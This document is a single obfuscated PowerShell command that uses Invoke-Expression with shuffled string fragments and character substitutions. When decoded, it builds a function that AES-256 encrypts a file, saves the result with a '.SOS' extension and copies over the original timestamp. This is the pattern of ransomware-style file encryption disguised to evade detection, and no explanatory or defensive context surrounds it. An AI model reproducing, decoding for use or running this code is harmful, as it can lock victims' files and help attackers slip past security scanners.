iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{18}{8}{45}{9}{39}{28}{24}{43}{38}{27}{53}{13}{36}{49}{16}{30}{17}{26}{21}{12}{0}{51}{4}{6}{10}{50}{5}{32}{34}{52}{42}{22}{29}{3}{44}{7}"-f '        }

        YPMencryptor = YPMaesMan','aged = New-Object System.Security.Cryptograp','  YPMaesMan','{
        YPMshaManaged.Dispose()
 ','r()
        YPMencryptedBytes = YPMencryptor.TransformFinal','edBytes
        YPMaesManaged.Dispose()
                
        if (YPMPath) {
         ','Block(YPMplainBytes, 0, YPMplainBytes.Length)
        YPMen','se()
    }
}','raphy.CipherMode]::CBC','ed.Padding = [System.Security.Cryptography.PaddingMode]::Z','cryptedBytes = YPMaesManaged','m
    (','::ReadAllBytes(YPMFile.FullName)
            YPMoutPath = YPMFile.FullName + jnO.SOSjnO
','sEOk))
                
        if (Y','arameterSetName = jnOCryptFilejnO)]
        [String]YPMPath
    )

    Begin {
        YPMshaMan','ra','M','
             ','ystem.Security.Cryptog','()]
    [Outpu','(Mandatory = YPMtrue, P',' = [System.IO.File]','e
            return jnOFile encrypted to YPMoutP','d
        YPMaesManaged.Mode = [S','sManaged.BlockSize','t','   Write-Error -Message jnOFile not found!jnO
                break
            }
            YPMplainBytes',' ','      YPMae','athjnO
        }
    }


    End ','Path -ErrorAction SilentlyContinue
            if (!YPMFile.FullName) {','hy.AesManage','   [System.IO.File]::WriteA','stem.','llBytes(YPMoutPath, YPMencryptedBytes)
      ','256Managed
      ','PMPath) {
            YPMFile = G','ography.SHA','28
','eros
  ','function Encryption {
    [CmdletBinding','
        [Parameter','= YPMFile.LastWriteTim',' = 1','       YPMaesManaged.Dispo','
        YPMaesManag','Type([string])]
    Pa','Security.Crypt','aged = New-Object Sy','et-Item -Path YP','.IV + YPMencrypt','aged.CreateEncrypto','      (Get-Item YPMoutPath).LastWriteTime ','       YPMaesManaged.KeySize = 256
    }

    Process {
        YPMaesManaged.Key = YPMshaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(EOkYPMencryptedByte')).rePlace(([cHaR]69+[cHaR]79+[cHaR]107),[STRInG][cHaR]39).rePlace(([cHaR]106+[cHaR]110+[cHaR]79),[STRInG][cHaR]34).rePlace(([cHaR]89+[cHaR]80+[cHaR]77),[STRInG][cHaR]36) )
